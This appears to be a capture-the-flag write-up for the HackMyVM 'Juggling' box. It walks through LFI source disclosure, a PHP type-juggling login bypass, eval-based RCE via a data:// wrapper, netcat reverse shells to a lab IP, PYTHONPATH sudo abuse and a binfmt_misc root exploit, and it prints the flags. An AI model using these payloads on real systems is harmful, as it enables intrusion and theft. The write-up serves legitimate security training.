# Juggling

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.194:22
Open 10.0.2.194:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.194
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 27:71:24:58:d3:7c:b3:8a:7b:32:49:d1:c8:0b:4c:ba (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCjRCpLEF00zJy/GkOtP8umEO3vDUpsiovHmmmfKN5njf5d4aqXBW3wUjqVL3VotabyslG6gNZnaPODVt2z3MdHsyNBuJZrbRrN26Dmz3x6pzJPnizxq2AXGzfgL89jQi83yr72gb2FpxGXm8BqYTTXwbiF7NIi+ekTmRWBa6LUQHgirqggrUq5xdmj0lTu+lMQ2Tzy4xfL6BKgyg4IaZlO9Kz9Z02ghG6VDr2vV9aInO4gu/i2nlvM+aErvWyREoqspjvhgPd0Q950AkOkKfjD5hHxLFZo7aR3PHJev+8zrKwsv/6bUAQIl8nUYifu/a+1vpSddyl37ikQNLY7RsCboBNtPryz7czF1UUtWMlICTHegrchZT3FEr+c5g51hEj+AkwwQoan2y8SCMhKIbWQQH0qBWNXnfNpKGS5y8Vn8s6KqZlsPq49/k9Pmr0jplaqgKDrPuiddGOehu5Yh6Fg5jsk5c5zXttWY17TyJdeab1LBOBJMY2ur4ZnSh+zv7E=
|   256 e2:30:67:38:7b:db:9a:86:21:01:3e:bf:0e:e7:4f:26 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOAIZW58yN/LbK35zNnyYvo4vNm1bnBkyDn4KzLYYyGBG2owUbmMp8WcmKWxT5ImSPDUE24mlhafaDEb8smp1Mc=
|   256 5d:78:c5:37:a8:58:dd:c4:b6:bd:ce:b5:ba:bf:53:dc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB57U+4lDKyoTXGtTCBdDtmnL1YvIhNjQpbp/tdjDYGx
80/tcp open  http    syn-ack nginx 1.18.0
|_http-server-header: nginx/1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://juggling.hmv
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

Make sure to update DNS with the `juggling.hmv` record

![writeup.png](/assets/pentest/hackmyvm/juggling/writeup.png)

Some weird authentication mechanism :D Username + Password + Val1 + Val2, but if Val1 and Val2 is passed Username and Password doesn't seem required

![writeup-1.png](/assets/pentest/hackmyvm/juggling/writeup-1.png)

Most likely Juggling refers to [PHP - Type Juggling](https://swisskyrepo.github.io/PayloadsAllTheThings/Type%20Juggling/)

After testing few truthy values it was unsuccessful.

The login panel contains url to `blog.php`
```html
<form notaction="blog.php?page=test" class="signin-form" method="POST">
```

### LFI

The `page` parameter adds `.php` at the end of filename, any file injection won't work
```bash
‚îî‚îÄ$ curl 'http://juggling.hmv/blog.php?page=test'
This file is just for testing :)                                                                                                                                                             
‚îî‚îÄ$ curl 'http://juggling.hmv/blog.php?page=index'
<!doctype html>
<html lang="en">
...
```

```php
‚îî‚îÄ$ curl 'http://juggling.hmv/blog.php?page=php://filter/convert.base64-encode/resource=index' -s | base64 -d | sed -n '/<?php/,/?>/p'
<?php
	session_start();
	require_once("sqldb_config.php");

	if(isset($_SESSION['username'])) {
		header("Location: admin.php");
		die();
	}

	if (isset($_POST['submit'])) {
		$username = $_POST['username'];
		$password = $_POST['password'];
		$val1 = $_POST['val1'];
		$val2 = $_POST['val2'];

		$magicval = strcasecmp($val1,$val2);
		$key = md5("$username".$password);
		if (empty($val) && empty($val2)) {
			echo '<br><h1 style="text-align:center;color:red;"> Value 1 and Value2 can\'t be Empty </h1>';
			header("Refresh:3");
		} else {
			if ($val1 === $val2) {
				echo '<br><h1 style="text-align:center;color:red;"> Value 1 and Value2 can\'t be Same </h1>';
				header("Refresh:3");
			} else {
				if ($key == number_format($magicval * 1337)) {
					$_SESSION['username'] = "ryan";
					header("Location: admin.php"); die();
					# header("Location: http://s3cur3.juggling.hmv/index.php");
					header("Location: ../s3cur3/index.php");
				} else {
					header("Refresh:3");
				}
			}
		}
	}
?>
```

Type juggling tests failed because `===` is used, which doesn't pose risk.

But `if ($key == number_format($magicval * 1337))` is vulnerable to type juggling

First we need proper magic value, which is `0`
```bash
‚îî‚îÄ$ php -r 'echo strcasecmp("a", "A");'
0

‚îî‚îÄ$ php -r 'echo strcasecmp("1", "2");'
-1
```

Now any md5 hash that starts with `0e...` like `0e215962017` 

```bash
‚îî‚îÄ$ curl 'http://juggling.hmv/index.php' -d 'username=0e215962017&password=&val1=a&val2=A&submit=' -si | grep Cookie
Set-Cookie: PHPSESSID=eocs2q5reqg83vf1vmvuf5tem5; path=/
```

More LFI
```bash
‚îî‚îÄ$ curl 'http://juggling.hmv/blog.php?page=php://filter/convert.base64-encode/resource=sqldb_config' -s | base64 -d | sed -n '/<?php/,/?>/p'
<?php
    $servername = "localhost";
    $username = "juggler";
    $password = "juggler#2021";
    $dbname = "jugglingdb";

    $conn = mysqli_connect($servername, $username, $password, $dbname);

    // if ($conn) {
    //    echo "Connection Successful";
    // } else {
    //    echo "Connection failed";
    // }
?>
```

```bash
‚îî‚îÄ$ curl 'http://juggling.hmv/blog.php?page=php://filter/convert.base64-encode/resource=../s3cur3/index' -s | base64 -d | sed -n '/<?php/,/?>/p'
<?php
    ini_set('session.cookie_domain', $_SERVER['SERVER_NAME']);
    session_start();

    if(!isset($_SESSION['username'])) {
        header("Location: http://juggling.hmv/");
        die();
    }
    eval(file_get_contents($_POST['system']));
?>
```

### RCE

To get code execution from `file_get_contents -> eval` chain we can use `data` wrapper
```bash
‚îî‚îÄ$ echo "system('id');" | base64
c3lzdGVtKCdpZCcpOwo=

‚îî‚îÄ$ php -r 'echo eval(file_get_contents("data://text/plain;base64,c3lzdGVtKCdpZCcpOwo="));'
uid=1000(woyag) gid=1000(woyag) groups=1000(woyag)

‚îî‚îÄ$ php -r 'eval(file_get_contents("data://text/plain;base64,c3lzdGVtKCdpZCcpOwo="));'
uid=1000(woyag) gid=1000(woyag) groups=1000(woyag)
```

But no output from webserver
```bash
‚îî‚îÄ$ curl 'http://juggling.hmv/admin.php' -b 'PHPSESSID=eocs2q5reqg83vf1vmvuf5tem5' --data-urlencode 'system=data://text/plain;base64,c3lzdGVtKCdpZCcpOwo=' -s | grep uid -i
```

And that's because I was on wrong page
```bash
‚îî‚îÄ$ curl 'http://s3cur3.juggling.hmv/index.php' -b 'PHPSESSID=eocs2q5reqg83vf1vmvuf5tem5' --data-urlencode 'system=data://text/plain;base64,c3lzdGVtKCdpZCcpOwo='
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
‚îî‚îÄ$ echo "system('busybox nc 10.0.2.149 4444 -e /bin/bash');" | base64 -w0
‚îî‚îÄ$ curl 'http://s3cur3.juggling.hmv/index.php' -b 'PHPSESSID=eocs2q5reqg83vf1vmvuf5tem5' --data-urlencode 'system=data://text/plain;base64,c3lzdGVtKCdidXN5Ym94IG5jIDEwLjAuMi4xNDkgNDQ0NCAtZSAvYmluL2Jhc2gnKTsK'
---
‚îî‚îÄ$ penelope -p 4444
www-data@juggling:~/s3cur3$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Lateral Movement

```bash
www-data@juggling:~$ sudo -l
Matching Defaults entries for www-data on juggling:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on juggling:
    (rehan) SETENV: NOPASSWD: /opt/md5.py
```

```bash
www-data@juggling:~$ cat /opt/md5.py
#!/usr/bin/python3
import hashlib

result = hashlib.md5("Hello World".encode()).hexdigest()
print(f"md5sum: {result}")
```

`PYTHONPATH`¬†is¬†an¬†**environment variable**¬†that tells the Python interpreter where to look for modules and packages to import, in addition to the standard library locations. It augments the default search path for module files, which is accessible within a Python program via the¬†`sys.path`¬†variable.

```bash
www-data@juggling:~$ echo $'import os;os.system("busybox nc 10.0.2.149 4444 -e /bin/bash")'
www-data@juggling:~$ sudo -u rehan PYTHONPATH=/tmp /opt/md5.py
[+] Got reverse shell from juggling~10.0.2.194-Linux-x86_64 üòçÔ∏è Assigned SessionID <3>
[!] Session detached ‚á≤ # Press F12
(Penelope)‚îÄ(Session [1])> sessions 3
rehan@juggling:/var/www$ id
uid=1001(rehan) gid=1001(rehan) groups=1001(rehan)
```

### SSH

```bash
‚îî‚îÄ$ gen_ssh_deploy id_rsa /home/rehan
[+] Running: ssh-keygen -f id_rsa -P x -q
[+] Remote command to run:
mkdir -p /home/rehan/.ssh ; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMHPYDTjtJkbgmeHCmK2GiNeQ+eBA7eSM0JJyKyl8Buf woyag@kraken' >> /home/rehan/.ssh/authorized_keys ; chmod 700 /home/rehan/.ssh ; chmod 600 /home/rehan/.ssh/authorized_keys
```

### User.txt

```bash
rehan@juggling:~$ cat user.txt
de0a7d9cb0e1ae6190e85549f63a26c1
```

## Privilege Escalation

No SUID, sudo, but some capabilities
```bash
rehan@juggling:~$ /sbin/getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/local/bin/register cap_dac_override=ep
```

```bash
rehan@juggling:~$ file /usr/local/bin/register
/usr/local/bin/register: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=77b1bc1a5d6700dad83368f9586364ab0a245447, for GNU/Linux 3.2.0, not stripped

rehan@juggling:~$ strings /usr/local/bin/register
/lib64/ld-linux-x86-64.so.2
strlen
read
close
open
write
...
/proc/sys/fs/binfmt_misc/register
...
```

- https://dogbolt.org/?id=bec20013-77ba-4790-b090-a405f6c55cdf#Hex-Rays=159
- [binfmt_misc](https://github.com/toffan/binfmt_misc)

```c
#include <unistd.h>
#include <fcntl.h>
#include <string.h>

int main() {
    char buf[512];
    read(0, buf, 0x200);
    int fd = open("/proc/sys/fs/binfmt_misc/register", O_WRONLY);
    write(fd, buf, strlen(buf));
    close(fd);
    return 0;
}
```

Fix the POC because we have middleware program writing to kernel 
```bash
-not_writeable && die "Error: $mountpoint/register is not writeable"

-		char* sh[] = {"/bin/sh", (char*) 0};
+		char* sh[] = {"/bin/bash", (char*) 0};

-echo "$binfmt_line" > "$mountpoint"/register
+echo "$binfmt_line" | /usr/local/bin/register
```

```bash
rehan@juggling:~$ /tmp/binfmt_rootkit
uid=0(root) euid=0(root)
# id
uid=0(root) gid=1001(rehan) groups=1001(rehan)
```

### Root.txt

```
# cat /root/root.txt
5401cd51a7ec8ddde279066ef17a28b7
```